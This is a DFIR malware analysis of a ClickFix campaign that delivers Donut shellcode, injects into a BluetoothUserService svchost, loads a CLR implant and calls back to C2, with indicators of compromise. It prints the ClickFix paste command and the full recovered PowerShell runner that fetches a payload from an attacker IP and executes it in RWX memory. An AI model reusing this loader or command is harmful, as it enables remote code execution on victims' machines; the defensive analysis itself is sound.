---
id: clickfix-clr-rat
title: "ClickFix to CLR RAT Delivery Chain"
summary: "ClickFix PowerShell lure to Donut shellcode, native MinGW injector into BluetoothUserService svchost, CLR implant sub00, and C2 on 91.92.243.161:3038."
category: DFIR
date: 2026-07-08
tags: [clickfix, donut, process-injection, clr, rat, delivery-chain]
---

# ClickFix to CLR RAT Delivery Chain

## Summary

```
CLASS      : RAT delivery / process injection
VECTOR     : ClickFix (PowerShell paste)
STAGE 1    : PowerShell stager → in-memory Donut shellcode
STAGE 2    : mod_s_enterprise (native MinGW loader / injector)
STAGE 3    : student_S.bin (native PE; CLR host candidate)
EXEC HOST  : svchost.exe -k BthAppGroup -p -s BluetoothUserService
IMPLANT    : CLR assembly sub00 (in-memory)
POST       : Screenshots, Edge DPAPI, additional unbacked CLR loads
C2         : 91.92.243.161:3038
```

ClickFix lure instructed the user to run a PowerShell one-liner. The `?sid=` response was a shellcode runner that fetched Donut-packed `/s_enterprise`, executed it in memory, and led into a MinGW injector targeting a Bluetooth-related `svchost` instance. Runtime telemetry showed CLR assembly `sub00` in that process, then screenshot collection, Edge DPAPI access, and outbound C2.

## Attack Chain

```
User pastes ClickFix PowerShell command
  → iex(irm http://158.94.211.77/?sid=<random>)
  → HTTP response body = PowerShell shellcode runner (Stage 1)
  → Stage 1 fetches http://158.94.211.76/s_enterprise
  → VirtualAlloc + Marshal.Copy + CreateThread (in-memory shellcode)
  → Donut unwrap → mod_s_enterprise (native PE injector)
  → Fetch http://158.94.211.76/enterprise/student_s.bin
  → Inject into svchost (BluetoothUserService)
  → CLR assembly sub00 loads in injected svchost
  → Screenshot / Edge DPAPI / additional unbacked CLR
  → C2 91.92.243.161:3038
```

## Initial Access - ClickFix

Fake verification workflow instructed the user to open PowerShell and execute:

```powershell
iex(irm http://158.94.211.77/?sid=<random>)
```

That request is only the delivery hook. The `?sid=` response body is the Stage 1 PowerShell script, which is immediately `iex`'d. User execution of the one-liner is the only initial access mechanism.

## Stage 1 - PowerShell Shellcode Runner (`?sid=` response)

Script returned by `http://158.94.211.77/?sid=<random>` after the ClickFix paste. It is not the enterprise payload; it pulls and executes `s_enterprise` in memory.

```
ClickFix one-liner
  → GET 158.94.211.77/?sid=…
  → response = this PowerShell script (iex)
  → GET 158.94.211.76/s_enterprise
  → RWX alloc + CreateThread on response bytes
  → Donut / mod_s_enterprise (Stage 2)
```

Hardcoded next stage: `http://158.94.211.76/s_enterprise`. No disk write of that blob.

### Recovered script (`?sid=` body)

```powershell
$EenFUwyrhNVtELZM = "http://158.94.211.76/s_enterprise"
try {
    $PjYUazzYSMbkG = Invoke-WebRequest -Uri $EenFUwyrhNVtELZM -UseBasicParsing -ErrorAction Stop
    $wRiirrT = $PjYUazzYSMbkG.Content
    $hwJSWjWCoW = $wRiirrT.Length
    $RMujqTOaRLVOuCSvPp = @"
using System;
using System.Runtime.InteropServices;
public class oYfHgawrHWFwsS {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr h, uint ms);
}
"@
    Add-Type -TypeDefinition $RMujqTOaRLVOuCSvPp
    $jPbjeyTmzEZJJyBT = 0x1000   # MEM_COMMIT
    $qPqKRSLlXbZN = 0x2000       # MEM_RESERVE
    $ooplDsMjgwQp = 0x40         # PAGE_EXECUTE_READWRITE
    $zYdkiDcSrCbO = [oYfHgawrHWFwsS]::VirtualAlloc(
        [IntPtr]::Zero, $hwJSWjWCoW,
        $jPbjeyTmzEZJJyBT -bor $qPqKRSLlXbZN, $ooplDsMjgwQp)
    if ($zYdkiDcSrCbO -eq [IntPtr]::Zero) { throw "Alloc failed" }
    [System.Runtime.InteropServices.Marshal]::Copy($wRiirrT, 0, $zYdkiDcSrCbO, $hwJSWjWCoW)
    $XWWJummsE = 0
    $IiWEOWQYLaoJrL = [oYfHgawrHWFwsS]::CreateThread(
        [IntPtr]::Zero, 0, $zYdkiDcSrCbO, [IntPtr]::Zero, 0, [ref]$XWWJummsE)
    if ($IiWEOWQYLaoJrL -eq [IntPtr]::Zero) { throw "Thread failed" }
    [oYfHgawrHWFwsS]::WaitForSingleObject($IiWEOWQYLaoJrL, 30000) | Out-Null
    Write-Host "done."
}
catch {
    exit 1
}
```

Recovered sample omitted the C# class close and here-string terminator (`}` / `"@`) immediately before `Add-Type`; those two lines are restored so the P/Invoke block is complete. Logic and identifiers match the recovered file.

### Execution after `?sid=`

| Step | Action |
|------|--------|
| 1 | Runs as the `iex` body from `158.94.211.77/?sid=…` |
| 2 | `Invoke-WebRequest` → `http://158.94.211.76/s_enterprise` |
| 3 | Response body held in `$wRiirrT` (length → alloc size) |
| 4 | `Add-Type` embeds kernel32 P/Invoke: `VirtualAlloc`, `CreateThread`, `WaitForSingleObject` |
| 5 | `VirtualAlloc(…, MEM_COMMIT\|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` |
| 6 | `Marshal.Copy` writes shellcode into the RWX region |
| 7 | `CreateThread` starts execution at that address |
| 8 | `WaitForSingleObject` (30s) keeps PowerShell alive while the thread runs |

Thread entry is the `/s_enterprise` download. That blob is Donut-class packing that unwraps to native `mod_s_enterprise` (Stage 2).

### `s_enterprise` (next stage)

- No PE headers; elevated entropy
- High-entropy noise and packing prologue fragments (`WAVAWH`, `A_A^A]A\_^]`)
- Consistent with packed/encoded shellcode (Donut-class wrapper)

## Stage 2 - Donut → mod_s_enterprise

Donut decryption of `s_enterprise` yields native PE `mod_s_enterprise`. This binary is the loader/injector that fetches and injects the next stage.

### capa / ATT&CK

| ATT&CK Tactic | Technique |
|---|---|
| Defense Evasion | Process Injection: Thread Execution Hijacking [T1055.003] |
| Defense Evasion | Reflective Code Loading [T1620] |
| Discovery | Process Discovery [T1057] / Software Discovery [T1518] |
| Execution | Shared Modules [T1129] |
| Privilege Escalation | Access Token Manipulation [T1134] |

Capabilities include WinHTTP request/response, TLS section/callback patterns, `SeDebugPrivilege`, process enumeration, thread injection, and execution of shellcode via indirect call / RWX thread.

### Toolchain / imports

MinGW-compiled (GCC 15.x), not MSVC. Notable imports from `ADVAPI32.dll`, `KERNEL32.dll`, `WINHTTP.dll`:

```
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
OpenProcess
AdjustTokenPrivileges
WinHttp*
```

### Staging strings (UTF-16LE)

```
svchost.exe
powershell
158.94.211.76
enterprise/student_s.bin
```

Hardcoded secondary stage path:

```
158.94.211.76/enterprise/student_s.bin
```

## Stage 3 - student_S.bin

Retrieved PE:

```
student_S.bin: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections
```

### Not a managed assembly

```bash
ilspycmd -p -o student_STAGE student_S.bin
```

```
ICSharpCode.Decompiler.Metadata.PEFileNotSupportedException:
PE file does not contain any managed metadata.
```

Treat as native PE. No managed metadata on disk.

### sub00 string

```bash
rabin2 -zz student_S.bin | grep -i sub00
```

```
3137  0x00030de8  0x140030de8  5  6  .data  ascii  sub00
```

Single `.data` reference. Runtime correlation in Stage 4.

## Stage 4 - Injection and CLR Load

First visible execution remains inside PowerShell. Defender records in-memory CLR assembly:

```
jq5ksud0
```

Then:

```
CreateRemoteThreadApiCall
```

Target process:

```
svchost.exe -k BthAppGroup -p -s BluetoothUserService
```

Matches injection capability flagged by capa on `mod_s_enterprise`. That remote thread places subsequent code into a legitimate service host.

Second CLR assembly loads inside the same BluetoothUserService `svchost`:

```
sub00
```

Name matches the `student_S.bin` `.data` string.

| Source | Finding |
|--------|---------|
| Static (`student_S.bin`) | Native PE; no managed metadata; string `sub00` in `.data` |
| Runtime (Defender) | CLR assembly named `sub00` in injected `svchost` |

Name correlation is strong. Mechanical link (e.g. manual CLR hosting via `mscoree.dll` / `CLRCreateInstance`) was not confirmed from the import table captured in this pass. Strongest injection import evidence sits on `mod_s_enterprise`; `student_S.bin` injection primitive is not fully resolved.

## Stage 5 - Post-Injection Behavior

Injected residence is a normal `svchost` service instance (`BluetoothUserService`), not Bluetooth-specific malware logic.

Defender telemetry from the injected process:

| Behavior | Observation |
|----------|-------------|
| Screenshots | `ScreenshotTaken` from injected service process |
| Credential access | `DPAPI Accessed / Microsoft Edge` |
| Further payloads | Multiple unbacked CLR assemblies loaded dynamically; no additional disk writes observed |

## Stage 6 - Command and Control

Post-execution infrastructure (not used for initial delivery):

```
91.92.243.161:3038
```

Sandbox execution of `student_S.bin` contacted the same host. Classification tags: RAT / Generic Agent / C2 Activity.

~28 MB outbound traffic observed in the surrounding window. Treat as suspicious outbound transfer until `DeviceNetworkEvents` rows confirm direction and content; not labeled confirmed exfiltration from current evidence alone.

### Infrastructure roles

```
Host                Role
------------------  --------------------------------------------------------
158.94.211.77       ClickFix delivery (`?sid=` stager host)
158.94.211.76       Payload staging (/s_enterprise, /enterprise/student_s.bin)
91.92.243.161:3038  Operational C2
```

## Artifacts

### s_enterprise

| Field | Value |
|-------|-------|
| Type | Donut shellcode wrapper (packed / high entropy) |
| Disk write | None (in-memory via PowerShell) |
| Unwraps to | `mod_s_enterprise` |

### mod_s_enterprise

```
MD5      881d500742127a52ae5a52a29de66ffb
SHA1     c4b150ad42a10b514a643357c8d7f9a9105f3ba1
SHA256   4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a
Format   PE32+, x86-64, MinGW/GCC 15.x
Role     Injector / secondary stage fetcher
```

### student_S.bin

```
Type     PE32+, x64, native (no managed metadata)
Compiled 2026-07-08 23:09:10 UTC
SHA256   53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db
String   sub00 (.data)
```

## Indicators of Compromise

### Hashes

```
File               Type    Hash
-----------------  ------  ----------------------------------------------------------------
mod_s_enterprise   MD5     881d500742127a52ae5a52a29de66ffb
mod_s_enterprise   SHA1    c4b150ad42a10b514a643357c8d7f9a9105f3ba1
mod_s_enterprise   SHA256  4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a
student_S.bin      SHA256  53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db
```

### Network

```
Indicator                                          Role
-------------------------------------------------  --------------------------------
158.94.211.77                                      ClickFix / initial PowerShell stage
158.94.211.76                                      Payload host
http://158.94.211.76/s_enterprise                  Donut shellcode
http://158.94.211.76/enterprise/student_s.bin      Secondary PE
91.92.243.161:3038                                 Operational C2
```

### Process / runtime

```
svchost.exe -k BthAppGroup -p -s BluetoothUserService
CreateRemoteThreadApiCall → BluetoothUserService
CLR assemblies (in-memory): jq5ksud0, sub00
```
